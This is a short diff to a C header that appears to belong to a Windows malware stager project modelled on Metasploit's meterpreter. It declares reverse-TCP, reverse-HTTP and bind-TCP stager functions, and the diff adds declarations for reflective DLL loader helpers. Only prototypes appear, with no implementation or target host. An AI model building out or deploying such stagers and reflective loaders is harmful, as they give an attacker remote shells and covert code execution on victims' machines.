@@ -8,9 +8,11 @@
 #include <windows.h> // Make *sure* windows.h gets included after everyting else ... redefinition hell...
 #include <time.h>
 #include <Wininet.h>
-
+#include <intrin.h>
 #include "Constants.h"
 #include "resource.h"
+
+#include <iostream>
 
 
 //Print if debugging ... learned that from meterpreter source code, metasploit.
@@ -55,3 +57,6 @@ void StagerRevereTCP(wchar_t* IP, wchar_t* iPort);
 void StagerReverseHTTP(wchar_t *IP, wchar_t *iPort, wchar_t *transport);
 
 void StagerBindTCP(wchar_t* IP, wchar_t* iPort);
+
+DWORD ReflectiveLoaderOffset(DWORD BaseAddress);
+DWORD RVAToOffset(IMAGE_NT_HEADERS32 * pNtHdr, DWORD dwRVA);
